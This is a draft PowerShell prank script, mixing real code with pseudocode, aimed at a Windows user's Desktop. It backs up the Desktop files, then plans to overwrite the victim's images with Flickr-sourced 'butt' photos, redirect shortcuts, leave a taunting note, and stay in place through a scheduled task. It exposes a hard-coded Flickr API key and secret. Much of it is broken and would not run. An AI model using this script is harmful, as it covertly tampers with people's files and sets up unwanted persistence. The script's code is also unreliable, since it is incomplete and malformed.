# Enumerate targets
# Copy Desktop to Goofin for safe keeping
Copy-Item -Path "$home\Desktop" -Destination "C:\Goofin\cuts" -Recurse 




if OneDrive installed then
$targets = (gci $home\OneDrive\Desktop\ -Recurse) 
$buttnum = echo $targets | Measure-Object


function Search-Flickr ([string]$tags, [int]$count = $buttnum) 
{
    $api_key = "cb00a11683798919c3264dfb4ff2ad61"
    $secret = "bb19a60407fb6a2b"
    $search = Invoke-RestMethod -Uri "http://api.flickr.com/services/rest/?method=flickr.photos.search&api_key=$api_key&secret=$secret&tags=$tags&extras=url_z&content_type=1&per_page=$count&format=rest" -Method Get
    $search = [xml] $search

Write-Verbose $search.OuterXml

$url = $search.rsp.photos.photo.url_z
if ($url -eq $null -or $url[0] -eq $null) {
    return
	}
return $url
}

# Main method for obtaining sweet butt shots for grand plan  
$buttno = (Get-Random -Maximum 100) 
$topic = "juicy butts "+(Get-Random -Maximum 100) 
$url = Search-Flickr $topic

    for each target in targets
        Where extension = any image extension
            Copy each item with original filename to Goofin/cuts        
            Loop through and replace file with $butts content sequentially, starting over if more targets > butts
        Where extension = .lnk 
            Copy each item with original filename to Goofin/cuts
            leave icon the same, just redirect link to open a google search for random butt search

# Hit 'em with it
cd Desktop  notepad buttboss.txt writefile "Now who's boss."  


# Politeness Module
# Reset the photots and icons after X minutes


# Persistence Module

# Schduled task for the script
# Could we set it to choose a number between 7-20 = x and create a that runs every x days?